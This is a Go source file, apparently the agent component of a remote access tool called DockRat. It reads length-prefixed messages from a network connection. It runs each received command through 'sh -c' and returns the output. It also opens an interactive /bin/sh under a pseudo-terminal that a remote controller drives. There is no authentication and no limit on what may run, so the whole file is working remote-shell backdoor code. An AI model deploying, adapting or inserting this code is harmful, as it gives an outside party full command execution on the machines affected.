package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

var shellStarted = false
var shellStdin io.WriteCloser

func StartAgent(conn net.Conn) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func handleCommand(msg protocol.Message, conn net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:    protocol.MsgResponse,
		Payload: output,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: buf[:n],
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				_, err = conn.Write(data)
				if err != nil {
					log.Println("[-] Shell write error:", err)
					return
				}
			}
		}()
		return
	}

	// 已启动 shell，则写入 stdin
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := shellStdin.Write([]byte(line))
	if err != nil {
		log.Println("[-] Write to shell error:", err)
	}
}
